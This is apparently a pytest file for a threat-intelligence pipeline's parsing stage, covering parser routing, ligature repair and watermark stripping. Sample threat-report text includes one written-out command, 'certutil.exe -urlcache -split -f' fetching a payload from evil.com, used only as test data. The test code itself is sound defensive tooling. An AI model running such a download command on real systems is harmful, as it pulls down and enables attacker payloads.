"""Unit tests for the parse_and_validate node.

Parser architecture after Docling migration:
- DoclingParser: PDF, HTML, DOCX, IMAGE (mocked in unit tests)
- TextParser: FREE_TEXT, MARKDOWN (tested directly)
- Not implemented: TWEET_URL, STIX_BUNDLE
"""

import pytest
from unittest.mock import patch, MagicMock, PropertyMock
from pathlib import Path

from app.graph.state import PipelineStatus, SourceType
from app.nodes.deterministic.parse import (
    parse_and_validate,
    _dispatch_parser,
    _docling,
    MIN_WORD_COUNT_WARNING,
)
from app.nodes.deterministic.parsers.base import ParseResult


# Reset the DoclingParser singleton's cached converters between tests so each
# @patch("docling.document_converter.DocumentConverter") fully takes effect.
# Without this, the first test's _get_converter() call caches a real (or
# mocked) DocumentConverter instance, and subsequent tests' patches don't
# replace it because the cache hit short-circuits the import. The cache is
# keyed by with_images, so reset() clears every variant.
@pytest.fixture(autouse=True)
def _reset_docling_singleton():
    _docling.reset()
    yield
    _docling.reset()


# Keep the figure stash out of the real upload dir during parse tests —
# parse_and_validate writes rendered figures there for PDF/HTML/DOCX/IMAGE
# sources whenever extract_figures isn't explicitly disabled.
@pytest.fixture(autouse=True)
def _isolate_figure_stash(tmp_path, monkeypatch):
    from app.config import settings
    monkeypatch.setattr(settings, "upload_dir", str(tmp_path / "uploads"))
    yield


# ── Helpers ──────────────────────────────────────────────────────────


def _mock_docling_result(markdown_text, page_count=3):
    """Create a mock Docling conversion result."""
    mock_doc = MagicMock()
    mock_doc.export_to_markdown.return_value = markdown_text
    mock_doc.pages = [MagicMock()] * page_count
    mock_doc.tables = []
    mock_doc.furniture = MagicMock()
    mock_doc.furniture.children = []

    mock_result = MagicMock()
    mock_result.document = mock_doc
    return mock_result


# ── parse_and_validate node function ────────────────────────────────


class TestParseAndValidate:
    """Tests for the top-level LangGraph node function."""

    def test_free_text_success(self, sample_text):
        """Parses free text and returns parsed_text with correct status."""
        state = {
            "source_type": SourceType.FREE_TEXT.value,
            "raw_content_path": sample_text,
        }
        result = parse_and_validate(state)

        assert result["status"] == PipelineStatus.PARSING.value
        assert result["current_node"] == "parse_and_validate"
        assert len(result["parsed_text"]) > 0
        assert "error" not in result

    @patch("docling.document_converter.DocumentConverter")
    def test_html_success_via_docling(self, mock_converter_cls, tmp_path):
        """HTML routes to DoclingParser and returns parsed text."""
        html_file = tmp_path / "report.html"
        html_file.write_text(
            "<html><body><article><h1>APT29 Campaign</h1>"
            "<p>The threat actors used spearphishing emails with malicious "
            "attachments to gain initial access to diplomatic networks.</p>"
            "</article></body></html>"
        )

        mock_converter_cls.return_value.convert.return_value = _mock_docling_result(
            "# APT29 Campaign\n\nThe threat actors used spearphishing emails "
            "with malicious attachments to gain initial access to diplomatic networks."
        )

        state = {
            "source_type": SourceType.HTML.value,
            "raw_content_path": str(html_file),
        }
        result = parse_and_validate(state)

        assert result["status"] == PipelineStatus.PARSING.value
        assert len(result["parsed_text"]) > 0

    def test_markdown_via_text_parser(self, sample_markdown):
        """MARKDOWN routes to TextParser and preserves content."""
        state = {
            "source_type": SourceType.MARKDOWN.value,
            "raw_content_path": sample_markdown,
        }
        result = parse_and_validate(state)

        assert result["status"] == PipelineStatus.PARSING.value
        assert len(result["parsed_text"]) > 0

    def test_empty_path_fails(self):
        """Empty raw_content_path sets FAILED status."""
        state = {
            "source_type": SourceType.FREE_TEXT.value,
            "raw_content_path": "",
        }
        result = parse_and_validate(state)

        assert result["status"] == PipelineStatus.FAILED.value
        assert result["error"] is not None
        assert result["parsed_text"] == ""

    def test_unknown_source_type_fails(self, sample_text):
        """Unknown source_type sets FAILED status."""
        state = {
            "source_type": "unknown_type",
            "raw_content_path": sample_text,
        }
        result = parse_and_validate(state)

        assert result["status"] == PipelineStatus.FAILED.value
        assert "Unknown source_type" in result["error"]

    def test_not_implemented_source_type(self, sample_text):
        """TWEET_URL, STIX_BUNDLE return NotImplementedError -> FAILED."""
        for stype in [SourceType.TWEET_URL.value,
                      SourceType.STIX_BUNDLE.value]:
            state = {
                "source_type": stype,
                "raw_content_path": sample_text,
            }
            result = parse_and_validate(state)

            assert result["status"] == PipelineStatus.FAILED.value, (
                f"Expected FAILED for {stype}"
            )
            assert "not yet implemented" in result["error"]

    def test_short_text_adds_warning(self):
        """Text shorter than MIN_WORD_COUNT_WARNING gets a warning."""
        short_text = "APT29 exploited CVE-2024-1234 for initial access."
        state = {
            "source_type": SourceType.FREE_TEXT.value,
            "raw_content_path": short_text,
        }
        result = parse_and_validate(state)

        # Should succeed but with a warning
        assert result["status"] == PipelineStatus.PARSING.value
        warnings = result.get("parse_warnings", [])
        assert any("short" in w.lower() for w in warnings)

    def test_file_not_found(self):
        """Non-existent file path returns FAILED for Docling-handled types."""
        state = {
            "source_type": SourceType.PDF.value,
            "raw_content_path": "/nonexistent/path/report.pdf",
        }
        result = parse_and_validate(state)

        assert result["status"] == PipelineStatus.FAILED.value
        assert "not found" in result["error"].lower() or "No such file" in result["error"]


# ── _dispatch_parser ────────────────────────────────────────────────


class TestDispatchParser:
    """Tests for parser routing logic."""

    def test_routes_to_text_parser(self, sample_text):
        """FREE_TEXT routes to TextParser."""
        result = _dispatch_parser(SourceType.FREE_TEXT.value, sample_text)
        assert isinstance(result, ParseResult)
        assert len(result.text) > 0

    def test_routes_markdown_to_text_parser(self, sample_markdown):
        """MARKDOWN routes to TextParser (same as FREE_TEXT)."""
        result = _dispatch_parser(SourceType.MARKDOWN.value, sample_markdown)
        assert isinstance(result, ParseResult)
        assert len(result.text) > 0

    @patch("docling.document_converter.DocumentConverter")
    def test_routes_pdf_to_docling(self, mock_converter_cls, tmp_path):
        """PDF routes to DoclingParser."""
        pdf_file = tmp_path / "report.pdf"
        pdf_file.write_bytes(b"%PDF-1.4 fake content")

        mock_converter_cls.return_value.convert.return_value = _mock_docling_result(
            "LockBit 3.0 actors exploited CVE-2023-46604 to gain initial access."
        )

        result = _dispatch_parser(SourceType.PDF.value, str(pdf_file))
        assert isinstance(result, ParseResult)
        assert len(result.text) > 0

    @patch("docling.document_converter.DocumentConverter")
    def test_routes_docx_to_docling(self, mock_converter_cls, tmp_path):
        """DOCX routes to DoclingParser (was previously _NOT_IMPLEMENTED)."""
        docx_file = tmp_path / "report.docx"
        docx_file.write_bytes(b"PK fake docx")

        mock_converter_cls.return_value.convert.return_value = _mock_docling_result(
            "Threat report content from Word document."
        )

        result = _dispatch_parser(SourceType.DOCX.value, str(docx_file))
        assert isinstance(result, ParseResult)
        assert len(result.text) > 0

    @patch("docling.document_converter.DocumentConverter")
    def test_routes_image_to_docling(self, mock_converter_cls, tmp_path):
        """IMAGE routes to DoclingParser with OCR (was previously _NOT_IMPLEMENTED)."""
        img_file = tmp_path / "screenshot.png"
        img_file.write_bytes(b"\x89PNG fake image")

        mock_converter_cls.return_value.convert.return_value = _mock_docling_result(
            "OCR extracted text from the image.", page_count=1
        )

        result = _dispatch_parser(SourceType.IMAGE.value, str(img_file))
        assert isinstance(result, ParseResult)
        assert "OCR" in result.text

    def test_empty_path_raises(self):
        """Empty raw_path raises ValueError."""
        with pytest.raises(ValueError, match="raw_content_path is empty"):
            _dispatch_parser(SourceType.FREE_TEXT.value, "")

    def test_not_implemented_raises(self, sample_text):
        """Not-yet-implemented types raise NotImplementedError."""
        with pytest.raises(NotImplementedError):
            _dispatch_parser(SourceType.TWEET_URL.value, sample_text)


# ── TextParser (handles FREE_TEXT and MARKDOWN) ─────────────────────


class TestTextParser:
    """Unit tests for the merged TextParser."""

    def test_parse_raw_string(self, sample_text):
        from app.nodes.deterministic.parsers.text_parser import TextParser
        parser = TextParser()
        result = parser.parse(sample_text)

        assert isinstance(result, ParseResult)
        assert "LockBit" in result.text
        assert "certutil.exe" in result.text
        assert result.word_count > 0

    def test_too_short_raises(self):
        from app.nodes.deterministic.parsers.text_parser import TextParser
        parser = TextParser()
        with pytest.raises(ValueError, match="too short"):
            parser.parse("hello")

    def test_file_encoding(self, tmp_path):
        """UTF-8 file is read correctly."""
        from app.nodes.deterministic.parsers.text_parser import TextParser
        parser = TextParser()

        txt_file = tmp_path / "report.txt"
        txt_file.write_text(
            "APT28 used spearphishing attachments to deliver "
            "CHOPSTICK malware targeting government networks.",
            encoding="utf-8",
        )
        result = parser.parse(str(txt_file))
        assert "APT28" in result.text
        assert "CHOPSTICK" in result.text

    def test_whitespace_normalization(self):
        from app.nodes.deterministic.parsers.text_parser import TextParser
        parser = TextParser()
        messy = (
            "LockBit actors exploited   CVE-2023-46604.\n\n\n\n\n"
            "They used certutil.exe to download a web shell."
        )
        result = parser.parse(messy)
        # 3+ newlines collapsed to 2
        assert "\n\n\n" not in result.text
        assert "LockBit" in result.text

    def test_parse_markdown_string(self, sample_markdown):
        """Markdown is handled as text, preserving formatting."""
        from app.nodes.deterministic.parsers.text_parser import TextParser
        parser = TextParser()
        result = parser.parse(sample_markdown)

        assert isinstance(result, ParseResult)
        assert result.word_count > 0
        assert "LockBit" in result.text or "Threat Report" in result.text

    def test_markdown_code_blocks_preserved(self):
        """Code blocks preserved verbatim (they contain command lines)."""
        from app.nodes.deterministic.parsers.text_parser import TextParser
        parser = TextParser()

        md = (
            "# Report\n\n"
            "The actor ran the following command:\n\n"
            "```\n"
            "certutil.exe -urlcache -split -f http://evil.com/payload.exe\n"
            "```\n\n"
            "This downloaded the payload to the target system.\n"
        )
        result = parser.parse(md)
        assert "certutil.exe" in result.text
        assert "-urlcache" in result.text

    def test_markdown_tables_preserved(self, sample_markdown):
        """Pipe-delimited tables come through as text."""
        from app.nodes.deterministic.parsers.text_parser import TextParser
        parser = TextParser()
        result = parser.parse(sample_markdown)
        assert "203.0.113.10" in result.text

    def test_markdown_file(self, tmp_path):
        """A .md file is read and returned as-is."""
        from app.nodes.deterministic.parsers.text_parser import TextParser
        parser = TextParser()

        md_file = tmp_path / "report.md"
        md_file.write_text(
            "# Test\n\nThis is a threat report about APT29 "
            "exploiting CVE-2024-1234 for initial access.\n"
        )
        result = parser.parse(str(md_file))
        assert isinstance(result, ParseResult)
        assert "APT29" in result.text

    def test_empty_string_raises(self):
        from app.nodes.deterministic.parsers.text_parser import TextParser
        parser = TextParser()
        with pytest.raises(ValueError, match="too short"):
            parser.parse("")

    def test_structured_doc_is_none(self, sample_text):
        """TextParser does not produce a structured_doc."""
        from app.nodes.deterministic.parsers.text_parser import TextParser
        parser = TextParser()
        result = parser.parse(sample_text)
        assert result.structured_doc is None


# ── DoclingParser ───────────────────────────────────────────────────


class TestDoclingParser:
    """Unit tests for the DoclingParser (Docling converter mocked)."""

    @patch("docling.document_converter.DocumentConverter")
    def test_parse_pdf(self, mock_converter_cls, tmp_path):
        """Parses a PDF file via Docling and returns ParseResult."""
        from app.nodes.deterministic.parsers.docling_parser import DoclingParser

        pdf_file = tmp_path / "report.pdf"
        pdf_file.write_bytes(b"%PDF-1.4 fake")

        markdown_out = (
            "# ActiveMQ CVE-2023-46604\n\n"
            "LockBit 3.0 actors exploited a remote code execution vulnerability.\n\n"
            "| IOC | Type |\n|---|---|\n| 203.0.113.10 | IP |\n"
        )
        mock_converter_cls.return_value.convert.return_value = _mock_docling_result(
            markdown_out, page_count=5
        )

        parser = DoclingParser()
        result = parser.parse(str(pdf_file))

        assert isinstance(result, ParseResult)
        assert "LockBit" in result.text
        assert "203.0.113.10" in result.text
        assert result.page_count == 5
        assert result.structured_doc is not None
        assert result.word_count > 0

    @patch("docling.document_converter.DocumentConverter")
    def test_parse_docx(self, mock_converter_cls, tmp_path):
        """DOCX parsing via Docling works correctly."""
        from app.nodes.deterministic.parsers.docling_parser import DoclingParser

        docx_file = tmp_path / "report.docx"
        docx_file.write_bytes(b"PK fake docx content")

        mock_converter_cls.return_value.convert.return_value = _mock_docling_result(
            "Threat analysis report content from a Word document "
            "describing APT28 operations."
        )

        parser = DoclingParser()
        result = parser.parse(str(docx_file))

        assert isinstance(result, ParseResult)
        assert "APT28" in result.text
        assert result.structured_doc is not None

    @patch("docling.document_converter.DocumentConverter")
    def test_empty_output_raises(self, mock_converter_cls, tmp_path):
        """Empty Docling output raises ValueError."""
        from app.nodes.deterministic.parsers.docling_parser import DoclingParser

        pdf_file = tmp_path / "empty.pdf"
        pdf_file.write_bytes(b"%PDF-1.4")

        mock_converter_cls.return_value.convert.return_value = _mock_docling_result("")

        parser = DoclingParser()
        with pytest.raises(ValueError, match="empty output"):
            parser.parse(str(pdf_file))

    @patch("docling.document_converter.DocumentConverter")
    def test_conversion_error_raises(self, mock_converter_cls, tmp_path):
        """Docling conversion failure raises ValueError."""
        from app.nodes.deterministic.parsers.docling_parser import DoclingParser

        pdf_file = tmp_path / "corrupt.pdf"
        pdf_file.write_bytes(b"not a real pdf")

        mock_converter_cls.return_value.convert.side_effect = RuntimeError("bad file")

        parser = DoclingParser()
        with pytest.raises(ValueError, match="Docling conversion failed"):
            parser.parse(str(pdf_file))

    def test_file_not_found_raises(self):
        """Non-existent file raises FileNotFoundError."""
        from app.nodes.deterministic.parsers.docling_parser import DoclingParser
        parser = DoclingParser()
        with pytest.raises(FileNotFoundError):
            parser.parse("/nonexistent/path/report.pdf")

    @patch("docling.document_converter.DocumentConverter")
    def test_short_output_adds_warning(self, mock_converter_cls, tmp_path):
        """Very short extraction triggers a warning."""
        from app.nodes.deterministic.parsers.docling_parser import DoclingParser

        pdf_file = tmp_path / "short.pdf"
        pdf_file.write_bytes(b"%PDF-1.4")

        mock_converter_cls.return_value.convert.return_value = _mock_docling_result(
            "Short text only.", page_count=1
        )

        parser = DoclingParser()
        result = parser.parse(str(pdf_file))

        assert any("short" in w.lower() or "very short" in w.lower()
                    for w in result.warnings)

    @patch("docling.document_converter.DocumentConverter")
    def test_lazy_init(self, mock_converter_cls, tmp_path):
        """DocumentConverter is not instantiated until first parse call."""
        from app.nodes.deterministic.parsers.docling_parser import DoclingParser

        parser = DoclingParser()
        assert parser._converters == {}

        pdf_file = tmp_path / "report.pdf"
        pdf_file.write_bytes(b"%PDF-1.4")

        mock_converter_cls.return_value.convert.return_value = _mock_docling_result(
            "Content that triggers lazy init of the converter."
        )

        parser.parse(str(pdf_file))
        assert parser._converters.get(False) is not None
        # The image-capable variant is a separate entry, still unbuilt.
        assert parser._converters.get(True) is None


class TestParserHygiene:
    """Ligature expansion and tracking-watermark stripping.

    Both live on BaseParser so Docling and Text parsers inherit them.
    """

    @staticmethod
    def _parser():
        from app.nodes.deterministic.parsers.base import BaseParser

        class _P(BaseParser):
            def parse(self, source):  # pragma: no cover - not exercised
                raise NotImplementedError

        return _P()

    def test_ligature_codepoints_expand(self):
        """Case 1: the extractor emitted U+FB01 and it needs expanding."""
        p = self._parser()
        assert p._normalize_ligatures("The \ufb01rst") == "The first"
        assert p._normalize_ligatures("\ufb02ag") == "flag"
        assert p._normalize_ligatures("di\ufb00er") == "differ"
        assert p._normalize_ligatures("e\ufb03cient") == "efficient"

    def test_dropped_ligature_letters_are_put_back(self):
        """Case 2 — the one that actually bites.

        Docling does not emit U+FB01 on these PDFs; it DROPS the glyph, so
        "identified" arrives as "identied" with nothing to expand. These are
        the shapes Docling produced on one vendor PDF.
        """
        p = self._parser()
        out = p._normalize_ligatures(
            "The vendor identied a nancially motivated group. Therst known "
            "exploitation. The actor modied the key. Condential and Proprietary."
        )
        assert "identified" in out
        assert "financially" in out
        assert "The first" in out
        assert "modified" in out
        assert "Confidential" in out
        # And none of the damaged forms survive as standalone words. Note the
        # word boundary matters: "nancially" is a substring of "financially",
        # so a plain `in` check would report a false failure.
        import re as _re
        for broken in ("identied", "nancially", "Therst", "modied", "Condential"):
            assert not _re.search(rf"\b{broken}\b", out)

    def test_short_repairs_are_skipped_inside_paths_and_commands(self):
        """"le" -> "file" is real damage, but must not rewrite a path."""
        p = self._parser()
        assert p._normalize_ligatures(
            "an HTML Application le named 'cont.hta'",
        ) == "an HTML Application file named 'cont.hta'"
        # Untouched: the token sits inside a path / command argument.
        assert p._normalize_ligatures(r"C:\le\payload.exe") == r"C:\le\payload.exe"
        assert p._normalize_ligatures("tar -xf le.pdf -C out") == "tar -xf le.pdf -C out"

    def test_text_without_ligatures_is_untouched(self):
        p = self._parser()
        assert p._normalize_ligatures("plain ascii text") == "plain ascii text"

    def test_trailing_watermark_is_stripped_and_warned(self):
        p = self._parser()
        # Shape of a real vendor tracking watermark: base64, no whitespace, footer.
        # Synthetic payload; the real one encoded a customer identifier.
        blob = (
            "cmVwb3J0LS0wMC0wMDAwMDAwMHx8cG9jX3VzZXJfMV8wMTIzNDU2Nzg5YWJjZGVm"
            "MDEyMzQ1Njc4OWFiY2RlZnx8dmVuZG9yX3BvY19leGFtcGxlX2Nv"
        )  # 116 chars, the real length seen on one vendor PDF
        text, warning = p._strip_tracking_watermark(f"Report body.\n\n{blob}")
        assert text == "Report body."
        assert warning is not None
        assert "watermark" in warning

    def test_short_base64_run_is_left_alone(self):
        """Below the length floor we prefer a false negative.

        Stripping a short token-like run risks eating real content (a hash,
        an ID); leaving it costs only noise.
        """
        p = self._parser()
        short = "a" * 60
        text, warning = p._strip_tracking_watermark(f"Body.\n\n{short}")
        assert warning is None
        assert short in text

    def test_no_watermark_returns_text_unchanged(self):
        p = self._parser()
        text, warning = p._strip_tracking_watermark("A normal closing sentence.")
        assert text == "A normal closing sentence."
        assert warning is None

    def test_prose_with_spaces_is_never_mistaken_for_a_watermark(self):
        p = self._parser()
        long_prose = "The actor ran a very long command with many spaces " * 4
        text, warning = p._strip_tracking_watermark(long_prose)
        assert warning is None
        assert text == long_prose
